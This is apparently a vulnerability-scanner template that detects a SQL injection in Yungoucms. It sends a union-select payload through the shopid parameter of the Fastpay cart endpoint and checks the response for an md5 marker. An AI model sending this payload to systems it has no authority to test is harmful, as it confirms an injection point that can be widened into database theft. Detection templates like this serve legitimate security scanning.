id: poc-yaml-yungoucms-sqli
info:
  name: Yungoucms SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  tags: sql-injection
  description: |
    SQL Injection vulnerability in Yungoucms allowing unauthorized data access.
variables:
  rand: '{{rand_int(10000, 21000)}}'
http:
  - raw:
      - |
        GET /?/member/cart/Fastpay&shopid=-1%20union%20select%20md5({{rand}}),2,3,4%20--+ HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{md5(rand)}}"
        part: body
